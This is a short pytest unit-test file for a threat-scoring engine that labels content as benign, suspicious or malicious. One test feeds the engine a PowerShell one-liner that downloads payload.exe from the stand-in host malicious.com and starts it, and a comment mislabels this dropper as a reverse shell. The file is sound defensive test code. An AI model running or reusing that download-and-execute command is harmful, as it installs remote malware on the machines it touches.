import pytest
from shared_lib.threat_scorer import ThreatScoringEngine, ThreatLevel

@pytest.fixture
def scorer():
    return ThreatScoringEngine()

@pytest.mark.unit
def test_threat_scorer_benign(scorer):
    # Normal case: Educational networking text
    content = "This guide explains how TCP/IP handshakes work in a normal network."
    result = scorer.score("guide.pdf", content, 0.9)
    assert result.level == ThreatLevel.BENIGN
    assert result.mitre_allowed is False

@pytest.mark.unit
def test_threat_scorer_malicious(scorer):
    # Normal case: Reverse shell snippet
    content = "invoke-webrequest -uri http://malicious.com/payload.exe -outfile payload.exe; start-process payload.exe"
    result = scorer.score("dropper.ps1", content, 0.9)
    assert result.level == ThreatLevel.MALICIOUS
    assert result.final_score > 0.5

@pytest.mark.unit
def test_threat_scorer_empty_input(scorer):
    # Edge case: empty string
    result = scorer.score("unknown.txt", "", 0.5)
    assert result.level == ThreatLevel.BENIGN
    assert result.final_score == 0.0

@pytest.mark.unit
def test_threat_scorer_educational_bypass(scorer):
    # Edge case: Educational document mentioning exploits but with clear benign intent
    content = "In this chapter, we learn how an attacker might write an exploit for educational purposes."
    result = scorer.score("tutorial.pdf", content, 0.9)
    # The keyword score should be heavily penalized by the educational bypass
    assert result.level in (ThreatLevel.BENIGN, ThreatLevel.SUSPICIOUS)
    assert result.mitre_allowed is False  # Fails the triple-gate for actual attack
